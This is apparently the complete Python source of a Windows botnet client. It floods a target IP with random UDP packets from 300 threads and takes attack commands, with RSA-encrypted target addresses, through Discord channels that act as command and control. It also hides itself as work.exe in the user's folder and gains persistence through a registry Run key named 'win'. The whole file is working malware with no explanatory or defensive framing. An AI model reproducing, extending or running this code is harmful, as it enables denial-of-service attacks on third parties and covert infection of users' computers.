import time
import socket
import threading
import time
import random
import rsa
import sys
import discord
import getpass
import winreg as reg
import os
from shutil import copyfile


p = sys.path[0]
app = sys.argv[0].split("\\")[-1]
user = getpass.getuser()
client = discord.Client()




class vova156dwa:
    def __init__(self,ip,time,threads=300):
        self.ip = ip
        self.port = 80
        self.threads = threads
        self.time=int(time)
        self.WORK = True

    def count_time(self):
        time.sleep(self.time)
        self.WORK=False

    
    def blank(self):
        while self.WORK:
            try:
                s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                data = random._urandom(1024)
                s.sendto(data,(self.ip,self.port))

            except:
                exit(1)
        
    def start_thread(self):
        for i in range(self.threads):
            t = threading.Thread(target=self.blank,daemon=True)
            t.start()
            
        
        threading.Thread(target=self.count_time())
    



def get_ip(msg):
    try:
        pri = rsa.PrivateKey(132511313531287187738683132893640677285516829103090162250270321922136330541418807625902958022044770781496464366619655259010670311235289943884974864526615623186320948967996023916749015093066979143865811267097515959863652303265895814127702942598925882150077988416217287461617637690483581709763444725544744513797, 65537, 63911227389267996967087830502389309372078390086814729672838161735154298672257001239714460535557214392363424358217200712300964003049213113756506535183570486015551833583578290944380661070566983253785399607511531875571118504050735276812031394704176676890350725720204535501939366739938605684014062526060186128865, 53671300398345256043542080944071648852025403688171312958204069674548866318158185087515498018962901786544481575881085953138678503556184958223468554229991067797236233, 2468941735113477037230662804354711930095598208568158130329712620825554607213120290121516048201432417186108224009752690520039645431768536663866909)
        msg = msg.encode().decode('unicode_escape').encode("raw_unicode_escape")
        ip = rsa.decrypt(msg,pri).decode()
        return ip
    except: return 1
def dis():
    @client.event
    async def on_ready():
        try:
            ch = client.get_channel(917419368869134416)
            async for msg in ch.history(limit=200):
                content = msg.content
                if content == fr"Online {user}":
                    await msg.delete()
                
            await ch.send(f"Online {user}")
        except:
            pass

    

    @client.event
    async def on_message(msg):
        try:
            check_ch = client.get_channel(918194467113168947)
            ch = client.get_channel(917432306300502066)
            if msg.channel == check_ch:
                if msg.content == ".check":
                    await msg.delete()
                    await check_ch.send(f"#Here {user}")
            if msg.content.startswith("."):
                msg = msg.content
                msg = msg.split("  ")
                ip = msg[1]
                ip = get_ip(ip)
                if ip != 1:
                    x = vova156dwa(ip,msg[-1])
                    x.start_thread()
                    await ch.send(f"Started {user}")
        except Exception as e: pass
    
    client.run("")
    


          
def startup(path):
        try:
            
            key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
            open = reg.OpenKey(reg.HKEY_CURRENT_USER,key_value,0,reg.KEY_ALL_ACCESS)
            reg.SetValueEx(open,"win",0,reg.REG_SZ,"")
            reg.SetValueEx(open,"win",0,reg.REG_SZ,path)
            reg.CloseKey(open)  
           
        except:
            pass

while True:
    try:
        
        
        if fr"{p}\{app}" == fr"C:\Users\{user}\work.exe":
            t = threading.Thread(target=dis(),daemon=True).start()
        else:
            global final
            final = fr"C:\Users\{user}\work.exe"
            if os.path.isfile(final) is True:
                break
            else:
                copyfile(fr"{p}\{app}",final)
                startup(fr"C:\Users\{user}\work.exe")
                break
        
                
        
    except Exception as e:
            pass
        
    
        
    
